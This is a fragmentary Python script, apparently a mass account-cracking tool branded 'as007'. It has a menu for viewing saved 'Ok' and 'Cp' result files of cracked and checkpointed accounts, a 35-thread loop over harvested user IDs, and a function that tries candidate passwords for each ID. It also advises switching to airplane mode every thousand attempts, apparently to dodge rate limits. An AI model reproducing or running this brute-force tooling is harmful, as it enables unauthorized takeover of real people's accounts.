...
def ___menu___():
    ...
    if ___menu___ in ['1','01']:
        ...
        print("\n%s[%s1%s]%s See as007 Ok.txt"%(B,P,B,P))
        print("%s[%s2%s]%s See as007 Cp.txt"%(B,P,B,P))
        ...
        if ___hasilz___ in ['1','01']:
            try:
                ...
                exit("%s[%s!%s]%s as007 Ok.txt There isn't any"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Ok.txt')
            print("\n%s[%s*%s]%s Total as007 Ok.txt :%s %s"%(B,P,B,P,H,len(open('Results/Ok.txt','r').readlines())))
        elif ___hasilz___ in ['2','02']:
            try:
                ___cp___ = open('Results/Cp.txt','r').read()
            except (IOError):
                exit("%s[%s!%s]%s as Cp.txt There isn't any"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Cp.txt')
            print("\n%s[%s*%s]%s Total as007 Cp.txt :%s %s"%(B,P,B,P,H,len(open('Results/Cp.txt','r').readlines())))
        ...
        os.system("xdg-open https://wa.me/+8801826842231?text=Hallo%20as%20X007")
        exit()
...
def ___metode___():
    ...
    if ___metode___ in ['1','01']:
        ...
        print("\n%s[%sX%s]%s as007 Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sX%s]%s as007 Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        ...
        print("\n%s[%sâ€¢%s]%s as007 Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s as007 Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = user.split('<=>')
...
def mbasic(ids, uid, pwx, **kwargs):
    ...
    sys.stdout.write(
        "\r\x1b[1;97m[AS] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
